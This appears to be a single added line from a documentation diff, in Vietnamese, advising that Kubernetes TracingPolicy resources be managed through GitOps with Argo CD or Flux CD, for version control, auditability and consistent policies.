+    Đối với các triển khai quy mô lớn, hãy quản lý các CRD `TracingPolicy` bằng các nguyên tắc GitOps. Lưu trữ các chính sách trong kho Git và sử dụng các công cụ như Argo CD hoặc Flux CD để đồng bộ hóa chúng trên các cụm. Điều này đảm bảo kiểm soát phiên bản, khả năng kiểm toán và áp dụng chính sách nhất quán. Cân nhắc sử dụng các công cụ tạo chính sách hoặc tạo mẫu nếu bạn có nhiều chính sách tương tự với các biến thể nhỏ.
